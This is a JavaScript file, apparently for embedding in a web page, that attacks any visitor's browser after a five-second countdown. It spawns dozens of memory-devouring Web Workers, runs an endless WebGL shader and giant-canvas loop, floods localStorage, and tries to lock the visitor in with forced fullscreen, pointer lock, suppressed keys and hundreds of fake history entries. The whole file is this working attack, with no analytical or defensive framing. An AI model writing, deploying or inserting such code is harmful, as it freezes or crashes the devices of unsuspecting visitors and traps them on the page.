(function() {
    window.onload = function() {
        const timerDisplay = document.getElementById('timer');
        let timeLeft = 5;

        const workerBlob = new Blob([`
            onmessage = function() {
                const b = [];
                const f = () => {
                    while(true) {
                        try {
                            let s = new SharedArrayBuffer(1024 * 1024 * 256);
                            let v = new Float64Array(s);
                            for(let i = 0; i < v.length; i++) {
                                v[i] = Math.tan(Math.random()) * Math.exp(Math.random());
                            }
                            b.push(v);
                        } catch(e) {
                            b.push(new Uint8Array(1024 * 1024 * 128));
                        }
                    }
                };
                f();
            };
        `], { type: 'application/javascript' });

        const workerUrl = URL.createObjectURL(workerBlob);
        const cores = (navigator.hardwareConcurrency || 8) * 12;
        const battalions = [];

        for(let i = 0; i < cores; i++) {
            battalions.push(new Worker(workerUrl));
        }

        const countdown = setInterval(() => {
            timeLeft--;
            if (timerDisplay) timerDisplay.textContent = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(countdown);
                ignite();
            }
        }, 1000);

        function ignite() {
            const body = document.documentElement;
            
            const lock = () => {
                body.requestFullscreen().catch(() => {});
                body.requestPointerLock();
                for(let i = 0; i < 500; i++) {
                    history.pushState(null, "", "#" + Math.random());
                }
            };

            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                lock();
            });

            battalions.forEach(w => w.postMessage('go'));

            const webgl = () => {
                const c = document.createElement('canvas');
                c.width = window.screen.width;
                c.height = window.screen.height;
                const gl = c.getContext('webgl2') || c.getContext('webgl');
                if (!gl) return;

                const vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
                gl.compileShader(vs);

                const fs = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(fs, 'precision highp float;void main(){vec4 c=vec4(0);for(int i=0;i<10000;i++){c+=sin(gl_FragCoord.x*gl_FragCoord.y+float(i));}gl_FragColor=c;}');
                gl.compileShader(fs);

                const pr = gl.createProgram();
                gl.attachShader(pr, vs);
                gl.attachShader(pr, fs);
                gl.linkProgram(pr);
                gl.useProgram(pr);

                const b = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, b);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
                const pa = gl.getAttribLocation(pr, 'p');
                gl.enableVertexAttribArray(pa);
                gl.vertexAttribPointer(pa, 2, gl.FLOAT, false, 0, 0);

                const render = () => {
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    requestAnimationFrame(render);
                };
                render();
            };

            const l = () => {
                const c = document.createElement('canvas');
                c.width = 16384;
                c.height = 16384;
                const x = c.getContext('2d', {alpha: false});
                x.filter = 'blur(100px) contrast(1000%) invert(100%)';
                x.drawImage(document.querySelector('img'), 0, 0, 16384, 16384);
                
                const b = new Blob([new Uint8Array(1024 * 1024 * 100)]);
                const u = URL.createObjectURL(b);
                const im = new Image();
                im.src = u;

                lock();
                Promise.resolve().then(l);
            };

            const db = () => {
                while(true) {
                    const d = new Array(1000000).fill("comedymoon").join("");
                    try { localStorage.setItem(Date.now() + Math.random(), d); } catch(e) {}
                }
            };

            lock();
            webgl();
            l();
            setTimeout(db, 1);
        }
    };
})();